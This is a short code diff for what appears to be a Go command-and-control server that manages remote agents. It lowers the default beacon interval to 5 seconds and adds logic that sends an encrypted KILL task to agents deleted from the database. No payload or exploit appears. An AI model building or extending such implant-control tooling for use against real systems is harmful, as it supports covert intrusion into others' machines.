@@ -103,7 +103,7 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 	}
 	sleepSec  := req.SleepSec
 	jitterPct := req.JitterPct
-	if sleepSec  <= 0 { sleepSec  = 60 }
+	if sleepSec  <= 0 { sleepSec  = 5 }
 	if jitterPct <  0 { jitterPct = 20 }
 
 	agent := &Agent{
@@ -150,6 +150,18 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 
 		switch msg.Type {
 		case "beacon":
+			ag, dbErr := s.db.GetAgent(agentID)
+			if dbErr != nil || !ag.Active {
+				// Agent was deleted or killed — send KILL using the session key
+				// (identical to the AES key stored in DB / ghost map) and close.
+				killWires := []taskWire{{ID: 0, Type: "KILL", Args: ""}}
+				pt, _ := json.Marshal(beaconResponse{Tasks: killWires})
+				if enc, encErr := Seal(key, pt); encErr == nil {
+					out, _ := json.Marshal(tcpMsg{Type: "tasks", Payload: json.RawMessage(`"` + base64.StdEncoding.EncodeToString(enc) + `"`)})
+					tcpWriteFrame(conn, out) //nolint:errcheck
+				}
+				return
+			}
 			s.db.TouchAgent(agentID)
 			tasks, _ := s.db.PendingTasks(agentID)
 
